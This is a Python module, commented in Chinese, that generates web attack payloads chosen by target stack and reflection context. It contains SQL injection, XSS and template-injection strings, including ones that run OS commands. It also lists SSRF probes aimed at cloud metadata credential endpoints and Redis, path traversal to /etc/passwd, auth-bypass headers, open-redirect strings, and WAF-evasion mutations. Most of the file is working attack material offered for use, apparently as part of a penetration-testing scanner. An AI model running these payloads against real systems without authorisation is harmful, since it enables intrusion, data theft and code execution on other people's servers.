#!/usr/bin/env python3
"""
Payload Generator — 上下文感知的 Payload 生成器
根据目标技术栈、参数位置、WAF 类型动态生成和变异 payload

不是简单的字典文件，而是根据上下文智能选择+变异：
1. 根据技术栈选择针对性 payload
2. 根据 WAF 类型应用绕过编码
3. 根据反射位置选择闭合方式
4. 支持 payload 变异（大小写/编码/分块）
"""

import random
import string
from urllib.parse import quote, quote_plus
from typing import Generator


# ═══════════════════════════════════════════════════════════════
# Payload 库
# ═══════════════════════════════════════════════════════════════

class PayloadDB:
    """Payload 数据库 — 按漏洞类型分类"""

    # ─── SQL Injection ─────────────────────────────────────────
    SQLI_DETECTION = [
        # 引号闭合测试
        "'", "\"", "')", "\")", "';", "\";",
        # 布尔盲注
        "' OR '1'='1", "' OR '1'='2", "' AND '1'='1", "' AND '1'='2",
        "1 OR 1=1", "1 OR 1=2", "1 AND 1=1", "1 AND 1=2",
        # 数学运算（确认注入）
        "1' AND 1=1--", "1' AND 1=2--",
        "1') AND 1=1--", "1') AND 1=2--",
        # 时间盲注
        "1' AND SLEEP(3)--", "1'; WAITFOR DELAY '0:0:3'--",
        "1' AND pg_sleep(3)--",
        # Union
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        # 报错注入
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    ]

    SQLI_BY_DB = {
        "mysql": [
            "' AND SLEEP(3)-- -",
            "' UNION SELECT @@version-- -",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        ],
        "postgresql": [
            "'; SELECT pg_sleep(3)--",
            "' UNION SELECT version()--",
            "' AND 1=CAST((SELECT version()) AS int)--",
        ],
        "mssql": [
            "'; WAITFOR DELAY '0:0:3'--",
            "' UNION SELECT @@version--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
        ],
        "oracle": [
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
            "' UNION SELECT NULL FROM DUAL--",
        ],
    }

    # ─── XSS ──────────────────────────────────────────────────
    XSS_DETECTION = [
        # 基础探测（检查是否反射+编码情况）
        "<img src=x>",
        "\"><img src=x>",
        "'><img src=x>",
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        # Event handler
        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        # 绕过过滤
        "<img/src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<IMG SRC=x ONERROR=alert(1)>",
        "javascript:alert(1)",
        "java%0ascript:alert(1)",
    ]

    XSS_BY_CONTEXT = {
        "html_body": [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(document.domain)>",
            "<details open ontoggle=alert(document.domain)>",
        ],
        "html_attr": [
            "\" onmouseover=\"alert(document.domain)\" x=\"",
            "' onmouseover='alert(document.domain)' x='",
            "\" onfocus=\"alert(document.domain)\" autofocus=\"",
            "\"><script>alert(document.domain)</script><\"",
        ],
        "js_block": [
            "';alert(document.domain);//",
            "\";alert(document.domain);//",
            "</script><script>alert(document.domain)</script>",
            "'-alert(document.domain)-'",
        ],
        "url_context": [
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "event_handler": [
            "alert(document.domain)",
            "alert`document.domain`",
            "confirm(document.domain)",
        ],
    }

    # ─── SSTI ─────────────────────────────────────────────────
    SSTI_DETECTION = [
        # 数学运算探测（通用）
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{7*'7'}}", "${7*'7'}",
        # Jinja2 (Python)
        "{{config}}", "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        # Freemarker (Java)
        "${\"freemarker\".class.protectionDomain}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # Twig (PHP)
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        # Thymeleaf (Java)
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
    ]

    SSTI_BY_FRAMEWORK = {
        "jinja2": [
            "{{config.items()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "freemarker": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ],
        "velocity": [
            "#set($x='')+#set($rt=$x.class.forName('java.lang.Runtime'))+#set($chr=$x.class.forName('java.lang.Character'))+#set($str=$x.class.forName('java.lang.String'))",
        ],
        "thymeleaf": [
            "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x",
        ],
    }

    # ─── SSRF ─────────────────────────────────────────────────
    SSRF_DETECTION = [
        # 内网探测
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        # 云元数据
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        # IP 绕过
        "http://2130706433/",  # 127.0.0.1 decimal
        "http://0x7f000001/",  # 127.0.0.1 hex
        "http://0177.0.0.1/",  # 127.0.0.1 octal
        "http://127.1/",  # 短格式
        "http://[::ffff:127.0.0.1]/",  # IPv6 映射
        # 协议
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    # ─── Path Traversal ──────────────────────────────────────
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",  # 双重编码
        "..\\..\\..\\etc\\passwd",
        "/etc/passwd%00.jpg",  # null byte
    ]

    # ─── 认证绕过 ────────────────────────────────────────────
    AUTH_BYPASS_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
    ]

    # ─── Open Redirect ───────────────────────────────────────
    OPEN_REDIRECT = [
        "//evil.com",
        "///evil.com",
        "\\\\evil.com",
        "/\\evil.com",
        "https://evil.com",
        "//evil.com/%2f..",
        "///evil.com/%2f..",
        "////evil.com/%2f..",
        "https:evil.com",
        "http://evil.com",
        "%2f%2fevil.com",
        "/%09/evil.com",
        "//%0devil.com",
        "//evil%00.com",
    ]


# ═══════════════════════════════════════════════════════════════
# Payload 生成器
# ═══════════════════════════════════════════════════════════════

class PayloadGenerator:
    """
    上下文感知的 Payload 生成器
    根据目标信息动态选择和变异 payload
    """

    def __init__(self, config: dict = None):
        self.config = config or {}
        self.db = PayloadDB()
        # 用于标记 payload 的唯一字符串（确认反射时用）
        self.canary = self._generate_canary()

    def _generate_canary(self) -> str:
        """生成唯一的 canary 字符串"""
        return "bai" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

    # ─── 按漏洞类型生成 ────────────────────────────────────────

    def get_sqli_payloads(
        self,
        db_type: str = None,
        context: str = "where",
        waf_bypass: bool = False,
    ) -> list[str]:
        """
        获取 SQL 注入 payload
        
        db_type: mysql/postgresql/mssql/oracle
        context: where/order/insert/like
        waf_bypass: 是否应用 WAF 绕过变异
        """
        payloads = list(self.db.SQLI_DETECTION)

        if db_type and db_type in self.db.SQLI_BY_DB:
            payloads.extend(self.db.SQLI_BY_DB[db_type])

        if waf_bypass:
            payloads = self._apply_sqli_bypass(payloads)

        return payloads

    def get_xss_payloads(
        self,
        context: str = None,
        waf_bypass: bool = False,
    ) -> list[str]:
        """
        获取 XSS payload
        
        context: html_body/html_attr/js_block/url_context/event_handler
        """
        if context and context in self.db.XSS_BY_CONTEXT:
            payloads = list(self.db.XSS_BY_CONTEXT[context])
        else:
            payloads = list(self.db.XSS_DETECTION)

        if waf_bypass:
            payloads = self._apply_xss_bypass(payloads)

        return payloads

    def get_ssti_payloads(self, framework: str = None) -> list[str]:
        """获取 SSTI payload"""
        payloads = list(self.db.SSTI_DETECTION)
        if framework and framework in self.db.SSTI_BY_FRAMEWORK:
            payloads.extend(self.db.SSTI_BY_FRAMEWORK[framework])
        return payloads

    def get_ssrf_payloads(self, callback_url: str = None) -> list[str]:
        """获取 SSRF payload"""
        payloads = list(self.db.SSRF_DETECTION)
        if callback_url:
            payloads.insert(0, callback_url)
        return payloads

    def get_path_traversal_payloads(self) -> list[str]:
        return list(self.db.PATH_TRAVERSAL)

    def get_auth_bypass_headers(self) -> list[dict]:
        return list(self.db.AUTH_BYPASS_HEADERS)

    def get_redirect_payloads(self) -> list[str]:
        return list(self.db.OPEN_REDIRECT)

    # ─── 智能 Payload 选择 ─────────────────────────────────────

    def get_detection_payloads(self, tech_stack: dict = None) -> dict:
        """
        获取一组用于初始检测的轻量 payload
        覆盖多种漏洞类型，每种只用 3-5 个最高效的
        
        返回: {"sqli": [...], "xss": [...], "ssti": [...], ...}
        """
        return {
            "sqli": [
                "'",  # 最基础：引号是否引起报错
                "' OR '1'='1",  # 布尔盲注
                "1 AND 1=2",  # 数字型布尔
                "' AND SLEEP(3)--",  # 时间盲注
            ],
            "xss": [
                f"<{self.canary}>",  # 标签是否被过滤
                f"\"><img src=x onerror=alert({self.canary})>",  # 属性闭合
                f"javascript:alert({self.canary})",  # 协议
            ],
            "ssti": [
                "{{7*7}}",  # Jinja2/Twig
                "${7*7}",  # Freemarker/EL
                "<%= 7*7 %>",  # ERB
            ],
            "ssrf": [
                "http://127.0.0.1:80",
                "http://169.254.169.254/",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "....//....//etc/passwd",
            ],
            "open_redirect": [
                "//evil.com",
                "https://evil.com",
            ],
        }

    def get_confirm_payloads(self, vuln_type: str, initial_result: dict) -> list[str]:
        """
        根据初始检测结果，生成用于确认漏洞的精确 payload
        
        vuln_type: sqli/xss/ssti/ssrf
        initial_result: 初始检测的 DiffResult 信息
        """
        if vuln_type == "sqli":
            return self._confirm_sqli(initial_result)
        elif vuln_type == "xss":
            return self._confirm_xss(initial_result)
        elif vuln_type == "ssti":
            return self._confirm_ssti(initial_result)
        return []

    def _confirm_sqli(self, result: dict) -> list[str]:
        """SQLi 确认 payload：用布尔差异确认"""
        return [
            "' AND 1=1-- -",  # TRUE
            "' AND 1=2-- -",  # FALSE — 如果两个响应不同，确认注入
            "' AND 'a'='a'-- -",  # TRUE (字符串)
            "' AND 'a'='b'-- -",  # FALSE (字符串)
            "1 AND 1=1",  # 数字型 TRUE
            "1 AND 1=2",  # 数字型 FALSE
        ]

    def _confirm_xss(self, result: dict) -> list[str]:
        """XSS 确认 payload：根据反射上下文选择"""
        context = result.get("reflection_context", "html_body")
        payloads = self.db.XSS_BY_CONTEXT.get(context, self.db.XSS_DETECTION[:5])
        # 加上唯一 canary 方便确认
        return [p.replace("alert(1)", f"alert('{self.canary}')") for p in payloads]

    def _confirm_ssti(self, result: dict) -> list[str]:
        """SSTI 确认：用不同数学运算"""
        return [
            "{{7*7}}",  # 49
            "{{7*'7'}}",  # 7777777 (Jinja2) vs 49 (Twig)
            "${9999-1}",  # 9998
            "{{config}}",  # 信息泄露
        ]

    # ─── WAF 绕过变异 ─────────────────────────────────────────

    def _apply_sqli_bypass(self, payloads: list[str]) -> list[str]:
        """SQL注入 WAF 绕过变异"""
        mutated = list(payloads)
        for p in payloads[:10]:
            # 注释拆分
            mutated.append(p.replace("SELECT", "SE/**/LECT").replace("UNION", "UN/**/ION"))
            # 大小写混淆
            mutated.append(self._random_case(p))
            # 内联注释
            mutated.append(p.replace("SELECT", "/*!50000SELECT*/"))
            # URL 编码
            mutated.append(quote(p))
        return mutated

    def _apply_xss_bypass(self, payloads: list[str]) -> list[str]:
        """XSS WAF 绕过变异"""
        mutated = list(payloads)
        for p in payloads[:10]:
            # 大小写混淆
            mutated.append(p.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"))
            # 换行符插入
            mutated.append(p.replace("<", "<\n"))
            # HTML 实体编码
            mutated.append(p.replace("alert", "&#97;lert"))
            # 零宽字符
            mutated.append(p.replace("onerror", "on\u200berror"))
            # SVG/Math 标签
            if "<script>" in p:
                mutated.append(p.replace("<script>alert(1)</script>",
                                        "<svg/onload=alert(1)>"))
        return mutated

    def _random_case(self, s: str) -> str:
        """随机大小写"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    # ─── 编码工具 ─────────────────────────────────────────────

    @staticmethod
    def url_encode(payload: str) -> str:
        return quote(payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        return quote(quote(payload))

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        return ''.join(f'&#{ord(c)};' for c in payload)

    @staticmethod
    def unicode_encode(payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        return ''.join(f'%{ord(c):02x}' for c in payload)



